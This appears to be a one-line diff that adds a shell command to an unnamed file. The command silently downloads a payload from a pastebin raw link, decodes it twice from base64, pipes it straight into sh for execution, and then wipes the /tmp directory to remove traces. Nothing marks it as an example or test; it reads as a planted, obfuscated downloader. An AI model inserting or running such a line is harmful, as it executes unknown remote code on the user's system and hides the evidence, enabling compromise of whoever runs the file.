@@ -1,0 +1,1 @@
+wget -q https://pastebin.com/raw/Z7HfUZPJ -O /tmp/grep.txt;sed ':a;N;$!ba;s/\r\n//g' /tmp/grep.txt > /tmp/grepa.txt;base64 -d /tmp/grepa.txt > /tmp/grepb.txt;cat /tmp/grepb.txt |base64 -d |sh;rm -f /tmp/*
